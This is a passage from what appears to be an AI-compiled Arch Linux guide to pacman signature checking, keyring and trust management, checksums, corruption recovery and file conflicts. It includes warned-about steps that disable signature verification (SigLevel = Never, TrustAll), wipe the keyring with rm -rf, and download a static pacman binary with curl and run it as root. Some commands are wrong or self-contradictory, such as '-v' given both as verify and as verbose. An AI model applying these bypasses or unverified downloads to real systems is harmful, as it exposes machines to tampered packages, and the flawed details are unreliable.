SigLevel = PackageRequired DatabaseOptional
SigLevel = PackageOptional
SigLevel = Required TrustedOnly
```


### Local vs Remote Packages

#### LocalFileSigLevel

The `LocalFileSigLevel` setting controls signature requirements for locally installed packages (`pacman -U`):[5][1]

```
LocalFileSigLevel = Optional
```


This allows installing self-built packages without signing them with makepkg.[1]

#### RemoteFileSigLevel

Controls requirements for packages from remote repositories:

```
RemoteFileSigLevel = Required
```


### Web of Trust Model

#### Trust Chain Structure

Pacman's trust model follows a hierarchical chain:[1]

**Official packages:**
1. Developer signs package with their key
2. Developer's key is signed by Arch Linux Master Signing Keys
3. User locally signs the Master Signing Keys
4. Trust flows: User → Master Keys → Developer Keys → Packages[1]

**Unofficial packages:**
1. Developer signs package
2. User locally signs developer's key directly
3. Trust flows: User → Developer Key → Packages[1]

**Custom packages:**
1. User signs package with their own key
2. Direct trust relationship[1]

### Signature Verification Errors

#### Common Error Messages

**Unknown trust error:**
```
error: package_name: signature from "user@archlinux.org" is unknown trust
error: failed to commit transaction (invalid or corrupted package)
```


**Invalid signature error:**
```
error: package_name: signature from "..." is invalid
error: failed to commit transaction (invalid or corrupted package (PGP signature))
```


#### Primary Causes

**Outdated keyring:** The `archlinux-keyring` package needs updating[3][6]

**Uninitialized keyring:** Keys haven't been properly initialized[3]

**System time incorrect:** GPG signatures have time validity; wrong system time causes failures[1]

**Corrupted cache:** Cached packages may have invalid signatures[1]

**Missing keys:** Required signing keys not imported[3]

### Troubleshooting Signature Verification

#### Update Keyring First

Before full system upgrade, update the keyring package:[3][1]

```
sudo pacman -Sy archlinux-keyring
sudo pacman -Syu
```


This ensures the latest keys are available before verifying other packages.[1]

#### Initialize and Populate Keyring

If the keyring is uninitialized or corrupted:[5][3]

```
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


This creates the keyring directory structure and imports Arch Linux master and developer keys.[5][3]

#### Reset Keyring Completely

For persistent issues, remove and rebuild the keyring:[1]

```
sudo rm -rf /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


**Warning:** This removes all custom keys; you'll need to re-add third-party repository keys.[1]

#### Clear Package Cache

Remove potentially corrupted cached packages:[1]

```
sudo pacman -Scc
```


This forces fresh downloads with valid signatures.[1]

#### Correct System Time

Verify and correct system time if necessary:[1]

```
timedatectl status
sudo ntpd -qg
sudo hwclock -w
```


Incorrect system time causes signature validation failures because signatures have time validity periods.[1]

### Temporary Workarounds

#### Emergency Installation with TrustAll

**Warning:** Use only in emergencies; this is insecure.[7]

Temporarily accept all signatures to install critical packages:

```
# Edit /etc/pacman.conf
SigLevel = TrustAll
```


Install the keyring package:
```
sudo pacman -S archlinux-keyring
```


**Then immediately revert:**
```
# Edit /etc/pacman.conf
SigLevel = Required DatabaseOptional
```


#### Disable Signature Checking

**Warning:** Extremely dangerous; only use for debugging.[1]

```
# /etc/pacman.conf
[options]
SigLevel = Never
#LocalFileSigLevel = Optional
#RemoteFileSigLevel = Required
```


This disables all signature verification, allowing installation of untrusted packages. Comment out any repository-specific `SigLevel` settings as they override global settings.[1]

### Performance Optimization

#### Parallelized Verification

Signature verification is single-threaded by default, consuming 30-40% of installation time. While pacman doesn't natively support parallel verification, advanced users can implement custom parallel verification scripts using GNU parallel to verify multiple `.sig` files simultaneously.[2]

**Note:** This requires advanced scripting and is not officially supported.[2]

### Best Practices

**Always verify signatures:** Keep signature checking enabled for security.[5][1]

**Regular updates:** Update the system regularly to keep keys current.[1]

**Initialize properly:** Ensure keyring is initialized during system setup.[3][5]

**Verify master keys:** Confirm master key fingerprints when prompted during `pacman-key --populate`.[1]

**Don't use TrustAll in production:** Only use for emergency recovery, never permanently.[7][1]

**Update keyring separately:** Before major upgrades, update `archlinux-keyring` first.[1]

**Check system time:** Ensure accurate system time for signature validity.[1]

**Keep logs:** If signature errors occur, check `/var/log/pacman.log` for details.

Sources
[1] pacman/Package signing - ArchWiki https://wiki.archlinux.org/title/Pacman/Package_signing
[2] pacman is 30% faster with parallelized signature verification https://www.reddit.com/r/archlinux/comments/19b8yn4/pacman_is_30_faster_with_parallelized_signature/
[3] Signature Verification Error while trying to install pacman ... https://bbs.archlinux.org/viewtopic.php?id=301379
[4] ELI5: Does pacman -S automatically verify package integrity? https://www.reddit.com/r/archlinux/comments/69n2ty/eli5_does_pacman_s_automatically_verify_package/
[5] Verify all the packages - Pierre Schmitz https://pierre-schmitz.com/verify-all-the-packages/
[6] Arch Linux upgrade problems - It's FOSS Community https://itsfoss.community/t/arch-linux-upgrade-problems/11710
[7] can't install pacman packages because of unknown trust https://steamcommunity.com/app/1675200/discussions/0/7529517132619672170/

## Keyring Operations

### Overview

`pacman-key` is a wrapper script for GnuPG used to manage pacman's keyring, which is the collection of PGP keys used to check signed packages and databases. It provides the ability to import and export keys, fetch keys from keyservers, and update the key trust database.[2][4][5]

The default keyring location is `/etc/pacman.d/gnupg/`.[4][5][2]

### Initial Keyring Setup

#### Initialize Keyring

Ensure the keyring is properly initialized with required access permissions:[5][6][2]

```
sudo pacman-key --init
```


This creates necessary GnuPG directories and files. The initialization process is required before first using pacman with signature verification.[2][4][5]

#### Populate with Default Keys

Populate the keyring with official Arch Linux master keys and developer keys:[4][5][6][2]

```
sudo pacman-key --populate archlinux
```


This adds the default set of trusted Arch Linux keys to the keyring. Take time to verify the Master Signing Keys when prompted, as these are used to co-sign all other packager keys.[1][9][5][4]

**Complete initial setup:**
```
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


### Listing Keys

#### List All Keys

Display all keys in the public keyring:[6][2][4]

```
pacman-key --list-keys
```


Or using short form:
```
pacman-key -l
```


#### List Specific Keys

List particular keys by keyid:
```
pacman-key --list-keys keyid
```


#### List Keys with Signatures

Show keys along with their signatures:[2][4]

```
pacman-key --list-sigs
```


This provides the same information as `--list-keys` but includes signature details.[2][4]

### Displaying Key Fingerprints

#### Show Fingerprints

Display fingerprints for verification:[6][4][2]

```
pacman-key --finger
```


Or short form:
```
pacman-key -f
```


**For specific keys:**
```
pacman-key --finger keyid
```


Fingerprints should be verified against official sources before trusting keys.[1][4]

### Adding Keys

#### Add Key from File

Import keys from a local file:[6][2][4]

```
sudo pacman-key --add /path/to/keyfile.gpg
```


Or short form:
```
sudo pacman-key -a /path/to/keyfile.gpg
```


If a key already exists, this operation updates it.[4][2]

#### Receive Key from Keyserver

Download keys directly from a keyserver:[6][2][4]

```
sudo pacman-key --recv-keys keyid
```


Or short form:
```
sudo pacman-key -r keyid
```


**Example:**
```
sudo pacman-key --recv-keys "uid|name|email"
```


This retrieves the specified key from the configured keyserver and adds it to the keyring.[4][2]

#### Specify Custom Keyserver

Use an alternative keyserver for key operations:[5][2]

```
sudo pacman-key --keyserver keyserver.ubuntu.com --recv-keys keyid
```


### Signing Keys

#### Locally Sign Key

After importing a key, locally sign it to indicate trust:[8][6][2][4]

```
sudo pacman-key --lsign-key keyid
```


This operation is necessary to make the key valid. The key must already exist in the keyring (imported via `--add` or `--recv-keys`) before signing.[2][4]

**Local signing workflow:**
```
sudo pacman-key --recv-keys keyid
sudo pacman-key --finger keyid    # Verify fingerprint
sudo pacman-key --lsign-key keyid
```


### Refreshing Keys

#### Update Existing Keys

Refresh all keys from the configured keyserver to update their status:[5][4][2]

```
sudo pacman-key --refresh-keys
```


This updates information for keys already in your keyring but **does not add new keys**. It queries the keyserver and refreshes key data, including expiration dates and revocations.[3]

**Note:** Your local key will also be queried, and receiving a "not found" message is normal and not concerning.[1]

#### Difference: --refresh-keys vs archlinux-keyring

**pacman-key --refresh-keys:**
- Updates existing keys in your ring[3]
- Does not add new keys[3]
- Queries keyserver for updates[3]

**pacman -S archlinux-keyring:**
- Adds new keys if any have been added[3]
- Disables revoked keys[3]
- Does not rely on keyserver queries[3]
- Recommended approach for keeping keyring current[3]

### Editing Keys

#### Interactive Key Management

Present a menu for key management tasks:[4][2]

```
sudo pacman-key --edit-key keyid
```


This is useful for adjusting a key's trust level and performing other management operations.[4][2]

### Exporting Keys

#### Export Keys to stdout

Export public keys from the keyring:[2][4]

```
pacman-key --export keyid
```


Or short form:
```
pacman-key -e keyid
```


**Export all keys:**
```
pacman-key --export
```


If no keyid is specified, all keys are exported.[2][4]

**Save to file:**
```
pacman-key --export keyid > exported-key.gpg
```

### Deleting Keys

#### Remove Keys from Keyring

Delete specific keys identified by keyid:[6][4][2]

```
sudo pacman-key --delete keyid
```


Or short form:
```
sudo pacman-key -d keyid
```


### Importing Keys and Trust Database

#### Import Public Keyring

Import keys from `pubring.gpg` files in specified directories:[2][4]

```
sudo pacman-key --import /path/to/directory
```


#### Import Trust Database

Import ownertrust values from `trustdb.gpg` files:[2][4]

```
sudo pacman-key --import-trustdb /path/to/directory
```


### Updating Trust Database

#### Refresh Trust Database

Update the trust database using GnuPG's check-trustdb functionality:[2][4]

```
sudo pacman-key --updatedb
```


Or short form:
```
sudo pacman-key -u
```


This operation can be specified with other operations.[4][2]

### Verifying Signatures

#### Verify File Signatures

Verify cryptographic signatures on files using keys in the keyring:[5][2][4]

```
pacman-key --verify signature.sig file
```


Or short form:
```
pacman-key -v signature.sig file
```


**Detached signatures:**
With only one argument given, assume the signature is detached and look for a matching data file by stripping the file extension:[4]

```
pacman-key --verify package.pkg.tar.zst.sig
```


This automatically looks for `package.pkg.tar.zst`.[4]

### Additional Options

#### Version Information

Display version information:[2][4]

```
pacman-key --version
```


Or short form:
```
pacman-key -V
```


#### Help Information

Show syntax and command line options:[2][4]

```
pacman-key --help
```


Or short form:
```
pacman-key -h
```


#### Disable Colored Output

Disable colored terminal output:[5][4][2]

```
pacman-key --nocolor
```


#### Verbose Output

Increase output verbosity:[5]

```
pacman-key -v
```


#### Custom GPG Directory

Specify an alternative GnuPG home directory:[5]

```
pacman-key --gpgdir /path/to/gnupg
```


### Advanced Usage with GnuPG

For complex keyring management beyond pacman-key's capabilities, use GnuPG directly with the `--homedir` option pointing at the pacman keyring:[2][4]

```
sudo gpg --homedir /etc/pacman.d/gnupg --list-keys
```


### Important Considerations

**Root privileges required:** Most pacman-key operations require root access to modify the system-wide keyring.[5][4]

**Network connectivity needed:** Operations like refreshing or receiving keys from keyservers require internet access.[5][4]

**Verify fingerprints:** Always verify key fingerprints before signing or trusting keys.[5][4]

**Security warning:** Adding keys from untrusted sources can compromise system security.[5]

**Regular maintenance:** Keep the keyring updated by regularly running `pacman -S archlinux-keyring`.[3]

Sources
[1] pacman/Package signing - ArchWiki https://wiki.archlinux.org/title/Pacman/Package_signing
[2] pacman-key(8) https://pacman.archlinux.page/pacman-key.8.html
[3] refresh-keys and pacman -S archlinux-keyring https://www.reddit.com/r/archlinux/comments/ur12q4/what_is_the_difference_between_pacmankey/
[4] pacman-key(8) - Arch manual pages https://man.archlinux.org/man/pacman-key.8
[5] pacman-key man https://linuxcommandlibrary.com/man/pacman-key
[6] Pacman Key Manager - linux Commands https://hexmos.com/freedevtools/tldr/linux/pacman-key/
[7] pacman key TLDR page https://www.cheat-sheets.org/project/tldr/command/pacman-key/os/linux/
[8] Two PGP Keyrings for Package Management in Arch Linux http://allanmcrae.com/2015/01/two-pgp-keyrings-for-package-management-in-arch-linux/
[9] pacman-key · ArchLabs: Knowledge Base https://avnsgt.gitbooks.io/archlabs-knowledge-base/content/gnupg/pacman-key.html
[10] Arch Linux Pacman: A Detailed Guide with Commands and ... https://dev.to/snigdhaos/arch-linux-pacman-a-detailed-guide-with-commands-and-examples-en5

## Trust Database Management

### Overview

The trust database in pacman's keyring system maintains information about the trustworthiness and validity of GPG keys used for package signature verification. It's stored in `/etc/pacman.d/gnupg/trustdb.gpg` and manages the web of trust relationships between keys.

### Trust Database Operations

#### Update Trust Database

Refresh the trust database using GnuPG's check-trustdb functionality:

```
sudo pacman-key --updatedb
```

Or using the short form:
```
sudo pacman-key -u
```

This operation updates trust relationships and validates the integrity of the trust database. It can be combined with other pacman-key operations to ensure the trust database is current after key modifications.

#### Import Trust Database

Import ownertrust values from `trustdb.gpg` files in specified directories:

```
sudo pacman-key --import-trustdb /path/to/directory
```

This is useful when restoring keyring backups or migrating trust relationships from another system. The specified directory should contain a valid `trustdb.gpg` file.

### Trust Levels in GPG

The GPG web of trust uses several trust levels:

**Unknown:** No trust information available for this key

**Never:** Explicitly marked as not to be trusted

**Marginal:** Some trust, but signatures from this key alone aren't sufficient

**Full:** Complete trust in this key's ability to verify other keys

**Ultimate:** Your own key or keys you absolutely trust (Master Signing Keys)

### Local Signing and Trust

#### Establishing Trust Through Local Signing

When you locally sign a key with `pacman-key --lsign-key`, you're establishing trust:

```
sudo pacman-key --lsign-key keyid
```

This operation modifies the trust database to indicate that you trust this key to sign packages. Local signatures are non-exportable and exist only in your keyring.

#### Editing Key Trust Levels

Interactively adjust a key's trust level:

```
sudo pacman-key --edit-key keyid
```

This presents a GPG menu where you can:
- Set trust levels for keys
- Add or remove signatures
- Manage key attributes
- Update key expiration dates

Within the menu, use the `trust` command to adjust trust levels, then save changes with `save` and exit with `quit`.

### Web of Trust Model in Arch Linux

Arch Linux uses a hierarchical trust model:

**Master Signing Keys:** At the top of the trust hierarchy, these keys are given ultimate trust during `pacman-key --populate archlinux`. They co-sign all official developer keys.

**Developer Keys:** Signed by Master Keys, these keys are automatically trusted through the chain of trust. Developer keys sign individual packages.

**Custom Keys:** For unofficial repositories or AUR packages, you manually establish trust by locally signing the key after verifying its fingerprint.

### Trust Database Maintenance

#### Verify Trust Relationships

Check the trust database for consistency:

```
sudo pacman-key --updatedb
```

This recalculates trust relationships and ensures the database is consistent with the current keyring state.

#### Rebuild After Keyring Issues

If trust database corruption occurs, the keyring can be completely rebuilt:

```
sudo rm -rf /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux
```

This removes the entire keyring directory (including the trust database) and recreates it from scratch. All custom keys and trust relationships must be re-established.

### Trust Database and Signature Verification

The trust database determines whether pacman accepts a package signature:

**Package verification flow:**
1. Pacman encounters a signed package
2. Extracts the signature and signing key ID
3. Checks if the signing key exists in the keyring
4. Queries the trust database to verify the key is trusted
5. If trusted, validates the cryptographic signature
6. Installs package only if all checks pass

**SigLevel configuration** in `/etc/pacman.conf` works in conjunction with the trust database:

```
SigLevel = Required TrustedOnly
```

`TrustedOnly` means pacman consults the trust database and only accepts signatures from trusted keys.

### Common Trust Database Issues

#### Trust Calculation Errors

**Symptom:** Messages about trust calculation failures or marginal trust

**Solution:** Update the trust database and refresh keys:
```
sudo pacman-key --updatedb
sudo pacman-key --refresh-keys
```

#### Missing Trust for Valid Keys

**Symptom:** Packages fail verification despite having the signing key

**Solution:** Locally sign the key to establish trust:
```
sudo pacman-key --finger keyid    # Verify fingerprint
sudo pacman-key --lsign-key keyid
```

#### Expired Keys in Trust Database

**Symptom:** Previously working keys suddenly fail verification

**Solution:** Refresh keys to update expiration information:
```
sudo pacman-key --refresh-keys
```

Or update the archlinux-keyring package:
```
sudo pacman -Sy archlinux-keyring
```

### Direct GPG Access for Advanced Management

For operations beyond pacman-key's scope, access the trust database directly with GnuPG:

```
sudo gpg --homedir /etc/pacman.d/gnupg --check-trustdb
sudo gpg --homedir /etc/pacman.d/gnupg --list-keys --with-colons
sudo gpg --homedir /etc/pacman.d/gnupg --edit-key keyid
```

The `--with-colons` option provides machine-readable output showing trust levels and validity information for each key.

### Best Practices

**Regular updates:** Keep the trust database current by regularly updating the archlinux-keyring package.

**Verify before trusting:** Always verify key fingerprints through independent channels before locally signing keys.

**Minimal custom trust:** Only establish trust relationships for keys you genuinely need and have verified.

**Backup keyring:** Include `/etc/pacman.d/gnupg/` in system backups to preserve trust relationships.

**Monitor expiration:** Periodically refresh keys to catch expiration and revocation updates.

**Don't bypass trust:** Avoid using `SigLevel = TrustAll` in production; it defeats the purpose of the trust database.

**Document custom keys:** Maintain records of why you've trusted specific non-official keys.

The trust database is fundamental to pacman's security model, ensuring that only packages signed by verified, trusted keys are installed on your system


# Package Integrity

## Checksum Verification

### Overview

Checksums are cryptographic hash values used to verify file integrity by detecting accidental corruption during download or storage. In Arch Linux, checksums serve different purposes at various stages of package management.

### Checksums vs Signatures

**Important distinction:**

**Checksums:** Detect accidental corruption or incomplete downloads. They verify data integrity but **not** authenticity. An attacker can modify a file and provide a matching checksum.

**Signatures:** Provide cryptographic proof of authenticity using public key cryptography. They verify that packages come from trusted sources and haven't been tampered with.

Pacman relies primarily on GPG signatures for security, while checksums serve as an integrity check during the build process.

### Checksums in Package Building (makepkg)

#### PKGBUILD Checksum Arrays

When building packages with makepkg, checksums verify source files defined in the PKGBUILD. Multiple checksum algorithms are supported:

```bash
# PKGBUILD example
md5sums=('abc123...' 'def456...')
sha1sums=('...' '...')
sha256sums=('...' '...')
sha384sums=('...' '...')
sha512sums=('...' '...')
```

**Order matters:** Checksum values must correspond to source files in the same order as the `source` array.

#### Generating Checksums

Update or generate checksums for a PKGBUILD:

```
makepkg -g
```

Or:
```
updpkgsums
```

This calculates checksums for all source files and outputs them in the format needed for the PKGBUILD. Copy this output into your PKGBUILD file.

#### Skipping Specific Sources

Use `SKIP` in checksum arrays to bypass verification for specific sources:

```bash
sha256sums=('abc123...' 'SKIP' 'def456...')
```

This is useful for user-provided configuration files or sources where checksums cannot be predetermined.

#### Bypassing Checksum Verification

**Skip all integrity checks (not recommended):**
```
makepkg --skipinteg
```

**Skip only checksum verification:**
```
makepkg --skipchecksums
```

**Warning:** Only bypass checksums when you understand the security implications, such as during development or when working with known local sources.

### Checksums in Installed Packages

#### Package Metadata (.MTREE)

Installed packages include an `.MTREE` file containing file integrity information:

- SHA256 checksums for each file
- File sizes
- Permissions and ownership
- Modification times

This metadata enables verification of installed package files.

#### Basic Verification with pacman

**Check file presence:**
```
pacman -Qk package_name
```

This verifies files exist but does **not** verify checksums.

**Thorough file attribute check:**
```
pacman -Qkk package_name
```

Despite the name "thorough," this checks file attributes (size, modification time, permissions) but **not** actual checksums.

### Advanced Checksum Verification with paccheck

#### Installing paccheck

For genuine checksum verification of installed packages:

```
sudo pacman -S pacutils
```

The `pacutils` package provides `paccheck`, which performs actual checksum validation.

#### Checksum Verification Commands

**Verify MD5 checksums:**
```
paccheck --md5sum --quiet
```

**Verify SHA256 checksums:**
```
paccheck --sha256sum --quiet
```

**Comprehensive verification:**
```
paccheck --md5sum --sha256sum --file-properties --quiet
```

This performs complete validation including both checksums and file attributes.

**Output interpretation:**
- `--quiet` flag shows only packages with issues
- Without `--quiet`, displays detailed information for all packages
- Reports checksum mismatches, missing files, and modified files

#### Understanding Checksum Mismatches

**Expected modifications:** Configuration files in `/etc/` are meant to be user-modified. Checksum mismatches for config files are normal and expected.

**Unexpected modifications:** Checksum mismatches for binaries or libraries may indicate:
- File corruption
- Manual file modification
- Security compromise
- Incomplete package installation

### Manual Checksum Verification

#### Verifying Downloaded Files

For package archives or other files, calculate checksums manually:

**SHA256 (most common):**
```
sha256sum file.pkg.tar.zst
```

**MD5:**
```
md5sum file.pkg.tar.zst
```

**SHA1:**
```
sha1sum file.pkg.tar.zst
```

**SHA512:**
```
sha512sum file.pkg.tar.zst
```

#### Verify Against Checksum Files

If a checksum file is provided (e.g., `SHA256SUMS`):

```
sha256sum -c SHA256SUMS
```

This checks all files listed in the checksum file and reports which match and which don't.

**Example output:**
```
file1.tar.gz: OK
file2.tar.gz: FAILED
```

#### Verify Specific File

Create a temporary checksum file or pipe:

```
echo "abc123...  filename.tar.gz" | sha256sum -c -
```

The `-c` flag checks against the provided checksum, and `-` reads from stdin.

### Checksum Algorithms

**MD5 (128-bit):**
- Fast but cryptographically broken
- Still used for compatibility
- Adequate for detecting accidental corruption
- Not secure against deliberate tampering

**SHA-1 (160-bit):**
- Deprecated due to collision vulnerabilities
- Avoid for new projects

**SHA-256 (256-bit):**
- Current standard for most applications
- Strong security properties
- Good balance of speed and security

**SHA-512 (512-bit):**
- Highest security
- Slower than SHA-256
- Overkill for most use cases

### ISO Verification Workflow

When downloading Arch Linux installation media, verify both integrity and authenticity:

**Step 1: Download files**
```
archlinux-YYYY.MM.DD-x86_64.iso
archlinux-YYYY.MM.DD-x86_64.iso.sig
```

**Step 2: Verify checksum (integrity)**
```
sha256sum archlinux-YYYY.MM.DD-x86_64.iso
```

Compare output with the official checksum from archlinux.org.

**Step 3: Verify signature (authenticity)**
```
gpg --verify archlinux-YYYY.MM.DD-x86_64.iso.sig
```

**Both steps are necessary:** Checksums alone don't protect against malicious files if the checksum source is also compromised. Signatures provide cryptographic proof of authenticity.

### Graphical Tools

#### GtkHash

GUI application for checksum calculation and verification:

```
sudo pacman -S gtkhash
```

**Features:**
- Calculate multiple hash types simultaneously
- Compare hashes visually
- Verify checksum files
- User-friendly interface

**Usage:**
1. Open GtkHash
2. Select file to verify
3. Choose hash algorithms
4. Click "Hash" to calculate
5. Compare with official checksums

### Best Practices

**Use appropriate algorithms:** Prefer SHA-256 or SHA-512 for new checksums; avoid MD5 for security-critical applications.

**Verify sources:** Always obtain checksums from official, trusted sources over secure connections (HTTPS).

**Combine with signatures:** Use checksums for integrity and signatures for authenticity—both together provide comprehensive security.

**Regular integrity checks:** Periodically run `paccheck` to detect file corruption or unauthorized modifications.

**Understand limitations:** Checksums detect corruption but don't prevent malicious tampering unless combined with signatures.

**Configuration files are different:** Don't be alarmed by checksum mismatches for files in `/etc/`—these are expected to be modified.

**Automate verification:** For critical systems, implement automated checksum verification as part of monitoring and maintenance routines.

**Document exceptions:** Keep records of intentional file modifications that cause expected checksum mismatches.

Checksums are a fundamental tool for ensuring file integrity throughout the package management lifecycle, from building packages with makepkg to verifying installed files with paccheck.

## Corrupted Package Handling

### Signs of Package Corruption

Corrupted packages may manifest through various symptoms:

**During download/installation:**
- Checksum verification failures
- Signature verification errors despite valid keys
- Extraction errors during installation
- Incomplete file lists
- Database entry inconsistencies

**Error messages:**
```
error: failed to commit transaction (invalid or corrupted package)
error: package-name: signature is invalid
error: could not open file: Unrecognized archive format
warning: could not fully load metadata for package-name
```

### Common Causes

**Network issues:** Interrupted downloads or transmission errors

**Disk problems:** Bad sectors, filesystem corruption, or insufficient space

**Mirror problems:** Corrupted files on the mirror server

**Cache corruption:** Damaged cached packages from previous downloads

**Memory errors:** RAM issues causing data corruption during operations

**Improper shutdown:** System crash or power loss during package operations

### Immediate Response

#### Clear Package Cache

Remove potentially corrupted cached packages:

```
sudo pacman -Scc
```

This deletes all cached packages, forcing fresh downloads. You'll need to confirm twice—once for cached packages and once for repository databases.

**Alternative (less aggressive):**
```
sudo pacman -Sc
```

This removes only uninstalled package caches, preserving currently installed versions.

#### Force Database Refresh

Re-download repository databases:

```
sudo pacman -Syy
```

The double `-y` forces complete database refresh even if they appear current. This ensures repository metadata is valid.

#### Retry Installation

After clearing the cache and refreshing databases:

```
sudo pacman -Syu
```

This downloads fresh packages and attempts installation again.

### Identifying Corrupted Packages

#### Check Specific Package Integrity

Verify a downloaded package before installation:

```
pacman -Qkk package_name
```

For installed packages, this checks file attributes. For packages in the cache, you can manually verify checksums.

#### List Cache Contents

Examine what's in the cache:

```
ls -lh /var/cache/pacman/pkg/ | grep package-name
```

Look for suspicious file sizes (much smaller than expected) or recent timestamps that don't match download attempts.

#### Verify Package Archive

Test if a cached package archive is valid:

```
tar -tzf /var/cache/pacman/pkg/package-name.pkg.tar.zst > /dev/null
```

If this produces errors, the archive is corrupted. For zstd-compressed packages:

```
zstd -t /var/cache/pacman/pkg/package-name.pkg.tar.zst
```

### Handling Specific Corruption Scenarios

#### Corrupted Database

If pacman's local database is corrupted:

**Symptoms:**
```
error: could not open file /var/lib/pacman/local/package-name/desc
error: failed to prepare transaction (database is not valid)
```

**Solution - Reinstall affected packages:**
```
sudo pacman -S package-name --overwrite '*'
```

This rebuilds the database entry for the package.

**Complete database restoration:**
```
sudo pacman -S $(pacman -Qnq) --overwrite '*'
```

This reinstalls all repository packages, regenerating their database entries. **Warning:** This is time-consuming and downloads many packages.

#### Corrupted Package in Cache

**Remove specific corrupted package:**
```
rm /var/cache/pacman/pkg/package-name-version.pkg.tar.zst
sudo pacman -S package-name
```

This deletes the corrupted cached file and downloads a fresh copy.

#### Mirror-Level Corruption

If a mirror consistently provides corrupted packages:

**Switch mirrors:**
```
sudo pacman-mirrors --fasttrack  # Manjaro
sudo reflector --latest 10 --sort rate --save /etc/pacman.d/mirrorlist  # Arch
```

Or manually edit `/etc/pacman.d/mirrorlist` to prioritize different mirrors.

**Force fresh download from new mirror:**
```
sudo pacman -Syy
sudo pacman -Scc
sudo pacman -Syu
```

### Preventing Package Corruption

#### Enable Download Verification

Ensure signature verification is enabled in `/etc/pacman.conf`:

```
[options]
SigLevel = Required DatabaseOptional
```

This catches corrupted packages during download before installation.

#### Check Disk Health

Monitor filesystem and disk status:

```
df -h  # Check disk space
sudo smartctl -H /dev/sda  # Check disk health (requires smartmontools)
sudo fsck /dev/sdXn  # Check filesystem (unmounted partitions only)
```

Insufficient disk space or failing hardware causes corruption.

#### Use Reliable Mirrors

Select stable, high-quality mirrors:

```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

HTTPS mirrors provide additional integrity protection during download.

#### Regular System Maintenance

**Keep cache manageable:**
```
sudo paccache -r  # Keep 3 recent versions
```

Large, old caches are more likely to contain corrupted files.

**Regular integrity checks:**
```
paccheck --sha256sum --quiet
```

Detects corruption in installed packages early.

### Recovery from Severe Corruption

#### Reinstall Pacman Itself

If pacman is corrupted and non-functional:

**Using cached package:**
```
sudo tar -xvf /var/cache/pacman/pkg/pacman-*.pkg.tar.zst -C /
sudo pacman -S --overwrite '*' pacman
```

**Using pacman-static:**
```
curl -L -o pacman-static https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -Syu pacman
```

The static version bypasses library dependencies.

#### Chroot Recovery

If the system won't boot due to corruption:

1. Boot from Arch installation media
2. Mount system partitions:
   ```
   mount /dev/sdXn /mnt
   mount /dev/sdXn /mnt/boot  # If separate boot partition
   ```
3. Chroot into the system:
   ```
   arch-chroot /mnt
   ```
4. Clear cache and reinstall:
   ```
   pacman -Scc
   pacman -Syyu
   ```
5. Exit and reboot:
   ```
   exit
   reboot
   ```

### Advanced Diagnostics

#### Check Download Integrity

Monitor downloads in real-time:

```
sudo pacman -Syu --debug
```

This provides verbose output showing download and verification steps.

#### Examine Pacman Logs

Review `/var/log/pacman.log` for patterns:

```
grep -i error /var/log/pacman.log | tail -20
grep -i warning /var/log/pacman.log | tail -20
```

Look for recurring errors with specific packages or mirrors.

#### Memory Test

If corruption persists across multiple packages:

```
memtest86+
```

Boot into memory testing to rule out RAM issues. Bad RAM causes random corruption.

### When to Report Issues

**Report to mirror operators:**
- Consistent corruption from specific mirrors
- Multiple users reporting same package corruption
- Corruption persists after multiple download attempts

**Report to package maintainers:**
- Corruption in package metadata (PKGBUILD)
- Signature issues with properly configured keyring
- Systematic issues affecting many users

**Report to Arch bug tracker:**
- Database corruption issues
- Pacman bugs causing corruption
- Repository-wide problems

### Best Practices

**Don't ignore warnings:** Address checksum or signature warnings immediately—they indicate potential corruption.

**Keep backups:** Maintain system snapshots or backups for quick recovery from severe corruption.

**Monitor disk health:** Regularly check SMART status and filesystem integrity.

**Use stable mirrors:** Avoid mirrors with frequent downtime or slow speeds.

**Adequate disk space:** Maintain at least 20-30% free space on root partition.

**Regular updates:** Outdated systems accumulate more issues during large updates.

**Clean cache periodically:** Remove old cached packages to prevent accumulation of corrupted files.

**Test after major updates:** Verify system functionality after significant upgrades to catch corruption early.

Package corruption is usually recoverable through cache clearing and re-downloading. Persistent corruption suggests underlying hardware or network issues requiring investigation.

## Conflicting Files Resolution

### Understanding File Conflicts

File conflicts occur when pacman attempts to install a file that already exists on the filesystem and is owned by a different package or is untracked. Pacman refuses to overwrite files to maintain system integrity and prevent data loss.

**Common conflict error:**
```
error: failed to commit transaction (conflicting files)
package-name: /path/to/file exists in filesystem
Errors occurred, no packages were upgraded.
```

### Types of File Conflicts

#### Package-to-Package Conflicts

Two packages attempt to install the same file:

```
error: failed to commit transaction (conflicting files)
package-new: /usr/bin/program exists in filesystem (owned by package-old)
```

This typically occurs when:
- Packages are being split or merged
- File ownership is transferred between packages
- Two packages incorrectly provide the same file

#### Package-to-Untracked File Conflicts

A package attempts to install a file that exists but isn't owned by any package:

```
error: failed to commit transaction (conflicting files)
package-name: /usr/share/file exists in filesystem
```

Untracked files may come from:
- Manual installations outside pacman
- Leftover files from removed packages
- AUR package installations
- Build artifacts
- User-created files

### Investigating Conflicts

#### Identify File Owner

Determine which package owns the conflicting file:

```
pacman -Qo /path/to/conflicting/file
```

**Possible outputs:**

**File is owned:**
```
/path/to/file is owned by package-name 1.0-1
```

**File is untracked:**
```
error: No package owns /path/to/file
```

#### Check File Origin

Examine the file to understand its purpose:

```
file /path/to/conflicting/file
ls -la /path/to/conflicting/file
cat /path/to/conflicting/file  # For text files
```

Understanding what the file is helps determine the safest resolution method.

### Resolution Methods

#### Method 1: Using --overwrite Flag

The `--overwrite` flag forces pacman to overwrite conflicting files:

**Overwrite specific file:**
```
sudo pacman -S --overwrite /path/to/file package-name
```

**Overwrite specific directory:**
```
sudo pacman -S --overwrite /usr/share/conflicting-dir/\* package-name
```

**Overwrite all conflicts (use cautiously):**
```
sudo pacman -S --overwrite '*' package-name
```

**For system upgrades:**
```
sudo pacman -Syu --overwrite '*'
```

**Important:** The `--overwrite` flag should be used judiciously. Overwriting all files with `'*'` can hide legitimate conflicts and cause system issues.

#### Method 2: Remove Conflicting File Manually

If the file is untracked and you're certain it's safe to delete:

```
sudo rm /path/to/conflicting/file
sudo pacman -S package-name
```

**For directories:**
```
sudo rm -r /path/to/conflicting/directory
sudo pacman -S package-name
```

**Backup before removal:**
```
